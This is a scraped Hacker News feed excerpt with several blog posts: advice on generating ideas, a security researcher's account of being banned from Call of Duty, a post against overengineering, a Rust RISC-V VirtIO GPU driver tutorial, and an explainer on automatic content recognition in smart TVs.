Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25206661">thread link</a>) | @thesephist
<br/>
November 24, 2020 | https://linus.coffee/note/having-ideas/ | <a href="https://web.archive.org/web/*/https://linus.coffee/note/having-ideas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>People ask me how I get so many <a href="https://thesephist.com/projects/">ideas for interesting side projects</a> and <a href="https://thesephist/posts/">blog posts</a>.</p>
<p>I think the best way to describe my growth as a writer/maker over time is that I’ve become more efficient at discovering and refining my own ideas.</p>
<p>There are always ideas floating around in your brain. Sometimes, it comes to you out of the blue in the shower. Sometimes, you’re reading the news over dinner and a particular combination of words sets off a lightbulb. Sometimes, you’re reading and a metaphor resonates with you, so you contemplate on it in the hopes that it leads to an interesting perspective on something else. The key is to <strong>pay attention to your own wandering mind</strong>, notice when good ideas pass by in your mind for a split second, and grab a hold of it and pin it down on your mental desk and don’t let go, until you can expand that idea into something more interesting or valuable.</p>
<hr>
<p>There are fundamentally two knobs you can turn in the imaginary faucet of ideas.</p>
<p>The first is your <strong>creative input</strong>. This is a measure of the diversity and volume of interesting stories, knowledge, music, ideas, and advice you hear regularly. More and more, interesting ideas come to me as a combination of something I read or learned before, and an interesting metaphor or perspective I hear in the moment. The more quality, creative content you consume, the more source material you have from which your brain can synthesize new creative ideas. The diversity of content matters here. You’re going to have much better luck producing creative ideas when you combine knowledge or stories about completely different, unrelated topics, than by combining related existing ideas with each other.</p>
<p>The second knob is your <strong>creative efficiency</strong>, which I define as the fraction of interesting ideas that may occur to you, that you capitalize on. The human mind has tens of thousands of thoughts a day. Because of that staggering volume, most of the time, we’re trained to tune things out and dismiss internal mental side-conversations. But I think prolific creatives are able to counteract that urge to stay focused and hook onto an interesting ideas whenever it passes them by, and then learn to develop it into an insight or a piece of work. Lots of writers I talk to who are starting out tell me that they have ideas that are “mildly interesting” – not completely obvious, but not insightful. The best writers and artists and storytellers have a <em>skill</em> of developing these mildly-interesting ideas and stories into something more profound or valuable, and I think this is a skill that comes only with practice.</p>

        <hr>
        <p>
            
            ←
            <a href="https://linus.coffee/note/writing-growth/"><em>Growth as a writer</em></a>
            
        </p>
        
    </article></div>]]>
            </description>
            <link>https://linus.coffee/note/having-ideas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25206661</guid>
            <pubDate>Wed, 25 Nov 2020 07:08:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Banned for Security Research]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25206462">thread link</a>) | @arkadiyt
<br/>
November 24, 2020 | https://nedwill.github.io/blog/jekyll/update/2020/11/25/banned-for-research.html | <a href="https://web.archive.org/web/*/https://nedwill.github.io/blog/jekyll/update/2020/11/25/banned-for-research.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>Note that this post does not reflect the opinions of my employer nor my colleagues, and I conducted this research on my own time.</em></p>

<p>About a week ago, Activision banned me from Call of Duty: Modern Warfare/Warzone (2019) for attempting to study the security of its networking code.</p>

<p>As a user, I think I ought to be able to research vulnerabilities when I may be at risk. Multiplayer games do a great deal of networked communication, both between the user and the vendor (e.g., for fetching stats or user configuration) and between users (when hosting a private game or communicating over the microphone). A user should be able to trust that playing the game in a typical manner should not lead to a compromise. Some initial background research revealed that other security researchers, like me, have reverse engineered previous iterations of the game to discover and report vulnerabilities. There is already a precedent for both the validity of the security risk and Activision’s demonstrated openness to vulnerability reports [<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20817">1</a>, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10718">2</a>, <a href="https://github.com/momo5502/cod-exploits/tree/master/huffman">3</a>, <a href="https://github.com/momo5502/cod-exploits/tree/master/steam-auth">4</a>].</p>

<p>To do this research, I needed to reverse engineer the networking code in the game’s executable, as this would allow me to review the code for memory corruption vulnerabilities. Unfortunately, the executable was heavily obfuscated, and IDA was unable to analyze it. Therefore, I had to dump the unobfuscated code from the memory of a running game process. I believe it was at this point where the developers flagged me as a suspected cheater. I did two things to try to read memory from the process while I was in the main menu to avoid affecting any players. First, I attached WinDbg, and the game exited (probably the flagging event). Next, I tried pausing the process before dumping memory from it. I simply dumped an image of the game from memory in the main menu and then exited normally.</p>

<p>After spending a few days reviewing the binary, I decided that the binary was so large and unwieldy to deal with that I would table the project for a later date. But unfortunately, I was banned about a month later, losing over a year of progress on my account. The ban saddens me on a personal level as I’ve reconnected with family and friends from throughout my life playing this game during the pandemic. But more importantly, this sends a clear signal: this research is not welcome. I believe I had a reasonable expectation that it would be. I had done similar work during a CTF, where I reverse engineered and fuzzed CS:GO without ever risking a ban. Valve regularly accepts bug reports, and in one case, they paid a researcher $18000 for <a href="https://hackerone.com/reports/470520">reporting a vulnerability</a>.</p>

<p>Cheating is one of the biggest threats to the experience of gamers online. I understand that the developers shoulder an impressive burden in preventing cheat development and use. They need to leverage a variety of signals to detect cheat development and use. I’m guessing that because they may not have seen security researchers reviewing their platform before, they interpret any attempt to reverse engineer as a sign of malicious behavior. No typical player would attach a debugger to the game, and therefore they probably assume they don’t need much more evidence beyond this to issue a ban. Let me be clear: at no point did I intend to develop or use a cheat, and at no point did I manipulate any aspect of the game for another player or even myself. To this day, I don’t know what exactly caused the ban, and there’s no process to appeal it. What if using a reversing tool as part of my job gets me flagged? This fear is in the back of my mind for all games with anti-cheat, not just Warzone.</p>

<p>Where do we go from here? Obviously, I’d appreciate it if Activision unbanned my account. More importantly, I think they should provide a way for security researchers to have a place in the ecosystem by carving out exemptions for security research and establishing a point of contact (even a bug bounty) for vulnerability reports. The task of managing cheaters on the PC platform is growing both in difficulty and <a href="https://www.pcgamer.com/the-controversy-over-riots-vanguard-anti-cheat-software-explained/">controversy</a> - and I believe that Activision should join Valve and other publishers in fostering a symbiotic relationship with security researchers rather than an adversarial one. Together we can make games safer from cheaters and malicious users alike.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://nedwill.github.io/blog/jekyll/update/2020/11/25/banned-for-research.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25206462</guid>
            <pubDate>Wed, 25 Nov 2020 06:23:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overengineering. Predicting the future does not work]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25206269">thread link</a>) | @DevTalker
<br/>
November 24, 2020 | https://ddimitrov.dev/2020/11/24/overengineering-predicting-the-future-does-not-work/ | <a href="https://web.archive.org/web/*/https://ddimitrov.dev/2020/11/24/overengineering-predicting-the-future-does-not-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


			
<p>This one will be short.</p>



<p>Yesterday, while I was browsing a programming forum, I came across a statement like this:</p>



<p>â€œâ€¦ and currently, I am creating some neat abstractions if I need something more in the futureâ€¦â€�.</p>



<p>This is so wrong! And let me tell you why.</p>



<h2>Overengineering</h2>



<p>Overengineering in software development means creating something that is not needed. Something that brings overhead to the development process and inefficiency to the end product.</p>



<p>An elementary example of overengineering is if all your applications data can be saved in a 10 line XML file, but you use a SQL database.</p>



<h2>Predicting the future</h2>



<p>One of the reasons overengineering happens is because of a lack of information.</p>



<p>Often developers want to predict the future, so they are ready when new requirements come, or requirements change.</p>



<p>The practice and statistics show that they are tragically bad at that.</p>



<p>In fact, even business people donâ€™t know how requirements will change.</p>



<p>Thatâ€™s why <a href="https://en.wikipedia.org/wiki/Agile_software_development">agile methodologies</a> were born.</p>



<p>In the modern world of software development, it often happens during one sprint to create functionality, and in the next one, to change it so drastically that it is better to start all over again.</p>



<p>Do you believe that you will have the right estimate and create the right thing from the first time with all this uncertainty and change? I believe not.</p>



<p>Predicting the future is a waste of <a href="https://ddimitrov.dev/2020/06/29/software-development-is-about-being-effective-and-efficient/">resources</a>, so donâ€™t do it.</p>



<h2>Inexperienced developers</h2>



<p>Inexperienced developers tend to create overengineered things by default ðŸ˜Š. And thatâ€™s is normal for their level.</p>



<p>They do it mainly because of two reasons.<br>1) They want to create something complicated and â€œcoolâ€�, trying new practices, patterns, and technologies.</p>



<p>2) They donâ€™t see a simple way of doing it.</p>



<p>Only gaining experience can solve the second one, but inexperienced developers should intentionally avoid the first one.</p>



<p>Donâ€™t get me wrong. <a href="https://ddimitrov.dev/2020/10/18/how-to-learn-to-become-a-good-software-developer/">New things should be tested</a>, but not directly on paying customerâ€™s projects.</p>
				
		</div></div>]]>
            </description>
            <link>https://ddimitrov.dev/2020/11/24/overengineering-predicting-the-future-does-not-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25206269</guid>
            <pubDate>Wed, 25 Nov 2020 05:29:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Graphical Output from Our Custom RISC-V Operating System in Rust]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25206221">thread link</a>) | @azhenley
<br/>
November 24, 2020 | https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/ | <a href="https://web.archive.org/web/*/https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								
								<div>
									
<p>An operating system is used to make our job easier when using graphics. In our instance, in addition to everything else. In this post, we will be writing a GPU (graphics processing unit) driver using the VirtIO specification. In here, we will allow user applications to have a portion of the screen as RAM–with what is commonly known as a <em>framebuffer</em>.</p>



<hr>



<h2>Contents</h2>



<ol><li><a href="#overview">Overview</a></li><li><a href="#pixels">Pixels and Resolution</a></li><li><a href="#virtio">The GPU VirtIO Device</a></li><li><a href="#init">Initialization</a></li><li><a href="#invalid">Invalidation and Transfer</a></li><li><a href="#response">Device Responses</a></li><li><a href="#user">User Space</a></li><li><a href="#api">Simple Graphics API</a></li><li><a href="#conclusion">Conclusions and Further Reading</a></li></ol>



<hr>



<h2 id="overview">Overview</h2>



<p>We command the virtual GPU (virtio-gpu) by sending certain commands to the host (the device). The guest (the OS driver) has an allocation of RAM that becomes the framebuffer. The driver then tells the device, “hey, here’s the RAM that we’re going to use to store pixel information.”</p>



<p>The RAM is contiguous in our OS, but according to the specification, this isn’t strictly required. We will give the driver a rectangle. Everything that falls within that rectangle will be copied to the host. We don’t want to keep copying the entire buffer over and over again.</p>



<p>We will be using the virtio protocol that we used for the block driver here, so I won’t rehash the general virtio protocol. However, the device-specific structures are a bit different, so we’ll cover that part more in depth.</p>



<hr>



<h2 id="pixels">Pixels and Resolution</h2>



<p>A framebuffer must be large enough to store \(\text{width}\times\text{height}\times\text{pixel size}\) number of bytes. There are \(\text{width}\times\text{height}\) number of pixels. Each pixel has a 1-byte red, green, blue, and alpha channels. So, each pixel is exactly 4 bytes with the configuration we’re going to specify.</p>



<p>The framebuffer for our junior GPU driver is going to support a fixed resolution of \(640\times 480\). If you’re a child of the 90s, you saw this resolution a lot. In fact, my first computer, a Laser Pal 386, had a 16-color monitor with a resolution of 640 pixels wide with 480 pixels tall.</p>



<div><figure><a href="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-13.png"><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-13.png" alt="" width="458" height="281" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-13.png 611w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-13-300x184.png 300w" sizes="(max-width: 458px) 100vw, 458px"></a></figure></div>



<p>There are red, green, and blue pixels so close together that by varying the intensity of these three channels, we can change the color. The closer we get to our monitors, the easier a pixel is to see.</p>



<div><figure><a href="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-14.png"><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-14.png" alt="" width="285" height="288" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-14.png 380w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-14-297x300.png 297w" sizes="(max-width: 285px) 100vw, 285px"></a><figcaption>Pixels on a Viewsonic VX2770SMH-LED monitor.</figcaption></figure></div>



<p>You can see these little squares. If you squint enough, you can see that they aren’t pure white. Instead, you can see bits of red, blue, and green. That’s because each one of these little squares is subdivided into three colors: yep, red, green, and blue! To make white, these pixels are turned up to 11 (get the joke?). To make black, we turn off all three channels of that pixel.</p>



<p>The resolution refers to how many of these squares are on our monitor. This is a 1920×1080 monitor. That means that there are 1920 of these squares going left to right, and there are 1080 of these squares from top to bottom. All in all, we have \(1920\times 1080=2,073,600\) number of pixels. Each one of these pixels is expressed using 4 bytes in the framebuffer, meaning we need \(2,073,600\times 4=8,294,400\) bytes in RAM to store the pixel information.</p>



<p>You can see why I limited our resolution to 640×480, which only requires \(640\times 480\times 4=1,228,800\) bytes–a bit over a megabyte.</p>



<hr>



<h2 id="virtio">The GPU VirtIO Device</h2>



<p>The GPU device requires us to read a more up-to-date VirtIO specification. I’ll be reading from version 1.1, which you can get a copy here: <a href="https://docs.oasis-open.org/virtio/virtio/v1.1/virtio-v1.1.html">https://docs.oasis-open.org/virtio/virtio/v1.1/virtio-v1.1.html</a>. Specifically, chapter 5.7 “GPU Device”. This is an <em>unaccelerated</em> 2D device, meaning that we must use the CPU to actually form the framebuffer, then we transfer our CPU formulated memory location to the host GPU, which is then responsible for drawing it to the screen.</p>



<p>The device uses a request/response system, where we the driver make a command to request something from the host (the GPU).  We add a bit of extra memory into our request so that the host can formulate its response. When the GPU interrupts us, we can take a look at this response memory location to see what the GPU told us. This is much like the <em>status</em> field on the block driver, where the block device tells us the status of our last request.</p>



<p>Each request starts with a <em>Command Header</em>, which in Rust looks as follows:</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#[repr(C)]
struct CtrlHeader {
	ctrl_type: CtrlType,
	flags: u32,
	fence_id: u64,
	ctx_id: u32,
	padding: u32
}</pre>



<p>The header is common for all requests and all responses. We can differentiate by the CtrlType enumeration, which is:</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#[repr(u32)]
enum CtrlType {
	/* 2d commands */
	CmdGetDisplayInfo = 0x0100,
	CmdResourceCreate2d,
	CmdResourceUref,
	CmdSetScanout,
	CmdResourceFlush,
	CmdTransferToHost2d,
	CmdResourceAttachBacking,
	CmdResourceDetachBacking,
	CmdGetCapsetInfo,
	CmdGetCapset,
	CmdGetEdid,
	/* cursor commands */
	CmdUpdateCursor = 0x0300,
	CmdMoveCursor,
	/* success responses */
	RespOkNoData = 0x1100,
	RespOkDisplayInfo,
	RespOkCapsetInfo,
	RespOkCapset,
	RespOkEdid,
	/* error responses */
	RespErrUnspec = 0x1200,
	RespErrOutOfMemory,
	RespErrInvalidScanoutId,
	RespErrInvalidResourceId,
	RespErrInvalidContextId,
	RespErrInvalidParameter,
}</pre>



<p>I took this directly from the specification, but Rust-ified the names to avoid getting yelled at by the linter.</p>



<h3>Pixel Formats</h3>



<p>Recall that the framebuffer is just a bunch of bytes in memory. We need to put a structure behind the framebuffer so the host (the GPU) knows how to interpret your sequence of bytes. There are several formats, but all-in-all, they just re-arrange the red, green, blue, and alpha channels. All are exactly 4 bytes, which makes the <em>stride</em> the same. The stride is the spacing from one pixel to another–4 bytes.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#[repr(u32)]
enum Formats {
	B8G8R8A8Unorm = 1,
	B8G8R8X8Unorm = 2,
	A8R8G8B8Unorm = 3,
	X8R8G8B8Unorm = 4,
	R8G8B8A8Unorm = 67,
	X8B8G8R8Unorm = 68,
	A8B8G8R8Unorm = 121,
	R8G8B8X8Unorm = 134,
}</pre>



<p>The type, <em>unorm</em>, is an 8-bit (1-byte) unsigned value from 0 through 255, where 0 represents no intensity and 255 represents full intensity, and a number in between is a linear-interpolation between no and full intensity. Since there are three color (and one alpha), that gives us \(256\times 256\times 256=16,776,216\) different colors or levels of colors.</p>



<p>For this tutorial, I selected <code>R8G8B8A8Unorm = 67</code>, which has red first, green second, blue third, and alpha fourth. This is a common ordering, so I’ll select it to make it easy to follow along.</p>



<p>Our selected format makes the pixel structure look as follows:</p>



<div><figure><a href="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21.png"><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-1024x614.png" alt="" width="512" height="307" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-1024x614.png 1024w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-300x180.png 300w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-768x461.png 768w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-1536x921.png 1536w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-2048x1228.png 2048w" sizes="(max-width: 512px) 100vw, 512px"></a></figure></div>



<p>Recall that each individual component R, G, B, and A are each one byte a piece, so each Pixel referred to by (x, y) is 4 bytes. This is why our memory pointer is a Pixel structure instead of a byte.</p>



<hr>



<h2 id="init">Initialization</h2>



<p>Just like all other virtio devices, we set up the virtqueues first and then we work on device-specific initialization. In my code, I just directly copied-and-pasted from the block driver into the gpu driver. The only thing I added to the Device structure was the framebuffer and dimensions of the framebuffer.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">pub struct Device {
	queue:        *mut Queue,
	dev:          *mut u32,
	idx:          u16,
	ack_used_idx: u16,
	framebuffer:  *mut Pixel,
	width:        u32,
	height:       u32,
}</pre>



<p>The specification tells us to do the following in order to initialize the device and get things ready to draw. I Rust-ified some of the content to match our enumerations.</p>



<h4>Create a framebuffer and configure scanout</h4>



<ol><li>Create a host resource using <code>CmdResourceCreate2d</code>.</li><li>Allocate a framebuffer from guest ram, and attach it as backing storage to the resource just created, using <code>CmdResourceAttachBacking</code>.</li><li>Use <code>CmdSetScanout</code> to link the framebuffer to a display scanout.</li></ol>



<h3>A Request Structure</h3>



<p>Recall that our request and response come packaged together. We will put them in separate descriptors, but whenever we get a response back from the device, it is going to be easier if we free just once to free both the request and response. So, in Rust, I created the Request structure to support doing this.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">struct Request&lt;RqT, RpT&gt; {
	request: RqT,
	response: RpT,
}
impl&lt;RqT, RpT&gt; Request&lt;RqT, RpT&gt; {
	pub fn new(request: RqT) -&gt; *mut Self {
		let sz = size_of::&lt;RqT&gt;() + size_of::&lt;RpT&gt;();
		let ptr = kmalloc(sz) as *mut Self;
		unsafe {
			(*ptr).request = request;
		}
		ptr
	}
}</pre>



<h4>Step 1: Create host resource</h4>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">let rq = Request::new(ResourceCreate2d {
	hdr: CtrlHeader {
		ctrl_type: CtrlType::CmdResourceCreate2d,
		flags: 0,
		fence_id: 0,
		ctx_id: 0,
		padding: 0,
	},
	resource_id: 1,
	format: Formats::R8G8B8A8Unorm,
	width: dev.width,
	height: dev.height,
});
let desc_c2d = Descriptor {
	addr: unsafe { &amp;(*rq).request as *const ResourceCreate2d as u64 },
	len: size_of::&lt;ResourceCreate2d&gt;() as u32,
	flags: VIRTIO_DESC_F_NEXT,
	next: (dev.idx + 1) % VIRTIO_RING_SIZE as u16,
};
let desc_c2d_resp = Descriptor {
	addr: unsafe { &amp;(*rq).response as *const CtrlHeader as u64 },
	len: size_of::&lt;CtrlHeader&gt;() as u32,
	flags: VIRTIO_DESC_F_WRITE,
	next: 0,
};
unsafe {
	let head = dev.idx;
	(*dev.queue).desc[dev.idx as usize] = desc_c2d;
	dev.idx = (dev.idx + 1) % VIRTIO_RING_SIZE as u16;
	(*dev.queue).desc[dev.idx as usize] = desc_c2d_resp;
	dev.idx = (dev.idx + 1) % VIRTIO_RING_SIZE as u16;
	(*dev.queue).avail.ring[(*dev.queue).avail.idx as usize % VIRTIO_RING_SIZE] = head;
	(*dev.queue).avail.idx = (*dev.queue).avail.idx.wrapping_add(1);
}</pre>



<p>All we’re really telling the GPU here is our resolution and the format of the framebuffer. When we create this, the host gets to configure itself, such as allocating an identical buffer to make transfers from our OS.</p>



<h4>Step 2: Attach framebuffer backing.</h4>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">let rq = Request3::new(AttachBacking {
	hdr: CtrlHeader {
		ctrl_type: CtrlType::CmdResourceAttachBacking,
		flags: 0,
		fence_id: 0,
		ctx_id: 0,
		padding: 0,
	},
	resource_id: 1,
	nr_entries: 1,
},
MemEntry {
	addr: dev.framebuffer as u64,
	length: dev.width * dev.height * size_of::&lt;Pixel&gt;() as u32,
	…</pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/">https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/</a></em></p>]]>
            </description>
            <link>https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25206221</guid>
            <pubDate>Wed, 25 Nov 2020 05:14:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Automatic Content Recognition (ACR) – How Does It Work?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25206054">thread link</a>) | @ponderingfish
<br/>
November 24, 2020 | https://ottverse.com/acr-automatic-content-recognition-how-does-it-work/ | <a href="https://web.archive.org/web/*/https://ottverse.com/acr-automatic-content-recognition-how-does-it-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><strong>Automatic Content Recognition (ACR) refers to technology embedded into OTT applications or SmartTVs that recognizes the content that you are watching by sampling small portions of the video/audio and comparing it with a large database. </strong></p>



<p>ACR is prevalent in SmartTVs and hand-held devices and plays a major role in the audience measurement and ad-tracking industry. </p>



<p>In this article, let’s take a look at how Automatic Content Recognition or ACR works and some use-cases for this technology. </p>



<hr>



<h2>Firstly, how is Data Gathered from OTT Applications?</h2>



<p>Before we look at ACR, let’s first take a quick look into the field of analytics and data gathering in OTT. </p>



<p>Typically, an SDK or library is integrated into an OTT application (HTML5, Android, iOS, SmartTV app, etc.) and then released to the public. Once it’s installed on a phone, or TV, the application can track the user’s actions, the content being watched, etc. at a very granular level. </p>



<p>Each time the user presses play/pause/stop/etc., the SDK records the action and reports it back to a server. Similarly, data points from millions of users are gathered, cleaned, and then presented in a useable format in dashboards back to the OTT content provider. </p>



<p>In most cases, it’s usually the publisher (aka content provider) who is the consumer of this information and the publisher uses it to improve their QoE, content offering, advertising strategies, etc. </p>



<p>You may think that this level of data-gathering is intrusive, but, the fact of the matter is that you agreed to this by pressing “Yes” on the consent form when you installed the app which in all likelihood, you didn’t read! </p>



<p>With that introduction to data-gathering (which is rather common in today’s world), let’s switch over to another form of intelligence-gathering – Automatic Content Recognition (ACR).</p>



<hr>



<h2>What is Automatic Content Recognition?</h2>



<p>Automatic Content Recognition refers to technology that samples the audio or video that a user is consuming, creates a fingerprint from that sample, and compares this against an extensive database of fingerprints to automatically recognize what was being watched or listened to. In some instances of ACR, the recorded sample might be directly transmitted to a server for processing and further information extraction.</p>



<hr>



<h2>How Does Automatic Content Recognition Work?</h2>



<p>As we’ve already seen, ACR works by sampling the video and/or audio and using that information to determine the content being consumed. This leads us to <strong>Acoustic (or Audio) Fingerprinting</strong> and <strong>Video Fingerprinting.</strong></p>



<p>Here’s a visual explanation of ACR works. Simply put, </p>



<ul><li>fingerprints are generated for the media that needs to be recognized (using either audio or video fingerprinting techniques). These fingerprints are stored in a database. </li><li>ACR-enabled SmartTVs, phones, or other devices generate similar fingerprints and transmit them to a server that compares these device-generated fingerprints with the main database to find a match. </li><li>Based on database-match, metrics or data are generated that provide insights into media consumption. </li></ul>







<div><figure><img loading="lazy" src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/11/image-3.png?resize=622%2C370&amp;ssl=1" alt="ACR Automatic Content Recognition
" width="622" height="370" srcset="https://889329.smushcdn.com/2063466/wp-content/uploads/2020/11/image-3.png?size=240x143&amp;lossy=1&amp;strip=1&amp;webp=1 240w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/11/image-3.png?resize=300%2C178&amp;ssl=1 300w, https://889329.smushcdn.com/2063466/wp-content/uploads/2020/11/image-3.png?size=480x286&amp;lossy=1&amp;strip=1&amp;webp=1 480w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/11/image-3.png?resize=768%2C457&amp;ssl=1 768w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/11/image-3.png?resize=1024%2C609&amp;ssl=1 1024w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/11/image-3.png?resize=1200%2C713&amp;ssl=1 1200w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/11/image-3.png?w=1396&amp;ssl=1 1396w" sizes="(max-width: 622px) 100vw, 622px" data-recalc-dims="1" data-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/11/image-3.png?resize=622%2C370&amp;ssl=1" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div>







<p>That’s fundamentally how fingerprinting and ACR works. Now, let’s take a look at the different techniques used in ACR.</p>



<h3>Acoustic Fingerprinting</h3>



<p>Quoting from Wikipedia, <strong><em>an acoustic fingerprint is a condensed digital summary, a fingerprint, deterministically generated from an audio signal, that can be used to identify an audio sample or quickly locate similar items in an audio database.</em></strong></p>



<p>Certain metrics such as frequency, amplitude, tempo, spectrum (i.e., characteristics in the frequency domain), etc. are used in building a fingerprint or signature of the audio signal. </p>



<p>Another reason why this is important is that audio is generally compressed before transmission. And compression algorithms generally remove characteristics of an audio signal that are not perceptible to humans. Hence, the acoustic fingerprinting algorithm that are you building should also take these sources of distortion and noise into account. </p>



<h3>Video Fingerprinting</h3>



<p>Similar to Audio Fingerprinting, in Video Fingerprinting, small video clips are made from the original video, and certain characteristics are extracted from it. These techniques take care to ensure that image manipulation technologies like compression, or resizing do not affect these fingerprints and the content can be recognized nonetheless. </p>



<h3>Digital Watermarking</h3>



<p>Watermarking is the process of embedding data into video/audio <strong>covertly </strong>such that the embedded information is not ordinarily or easily detected. The watermark can be detected only by specialized and authorized <strong>watermark&nbsp;detecting software</strong>. Watermarking allows publishers to track piracy and establish authenticity.  In the case of Automatic Content Recognition, one can use Watermarking as a method of detecting if someone has engaged with or watched a content. </p>



<hr>



<h2>Uses of ACR</h2>



<p>There are several uses of ACR technology. Some of the more prominent ones are – </p>



<ol><li><strong>Detection of copyright infringement: </strong>Copyrighted material such as video and audio are often used indiscriminately without attributing or paying royalties to the original content creators. If a database of copyrighted content exists, then large UGC platforms such as YouTube, TikTok, Vimeo, etc. could check to see if user-uploaded content contains copyrighted material or not. </li><li><strong>Ad-tracking</strong>: ACR has found a lot of use in the advertising industry and for good reason. Here’s why –<ol><li>Unless you have the <strong>ability to determine if an ad was played and watched by the end-user </strong>(instead of being buried at the end of a long landing page), then your metrics don’t make a lot of sense and it could lead to inflated data with respect to ad impressions, plays, and completion rates. This requires SDKs and changes to the players that can consume a lot of effort and development cycles. </li><li>However, ACR has the ability to recognize the content that is being played by sampling certain pixels of video, or by recognizing the audio. This enables ACR to provide a better picture to the advertisers and publishers on the ad delivery and engagement. </li></ol></li><li><strong>Collating information from different sources</strong>: This is a very interesting use-case of ACR. In most homes, there is one big TV in the living room where people gather to watch movies. However, the content streaming to the TV could come from an STB, Chromecast, Roku, FireStick, or an Xbox. Instead of embedding code inside all these devices, SmartTVs with ACR can recognize the content being played (from the “glass”) and report on it. This allows for content attribution and normalization across a variety of sources. </li><li><strong>Understanding Audiences and their preferences</strong>: Similar to other methods of gathering usage analytics, ACR allows broadcasters and content providers to know how their audience is responding to their content, marketing, strategies, etc. By having fine-grained information about their audience and their usage patterns, broadcasters can better invest their dollars and get a much higher ROI. </li><li><strong>Ad Retargeting by OEMs</strong>: Samsung includes ACR technology in their SmartTVs and sells ad inventory and provides<a href="https://www.samsung.com/us/business/samsungads/resources/tv-ad-retargeting/" target="_blank" rel="noopener"> ad-retargeting services</a>. According to their website, “<em>Samsung Ads offers TV Ad Retargeting that empowers brands to identify audiences who saw or missed their TV spots and reconnect with them via mobile, tablet, desktop or OTT</em>.” And, <em>“Samsung Smart TVs have built-in Automated Content Recognition (ACR) technology that can understand viewing behavior and usage including programs, movies, ads, gaming content and OTT apps in real-time”</em>. You can read more about Samsung’s Privacy Policy <a href="https://www.samsung.com/sg/info/privacy/" target="_blank" rel="noopener">here</a> where they are pretty open about recording your video and audio to understand “you” better! </li></ol>











<hr>



<h2>Controversies Surrounding ACR</h2>



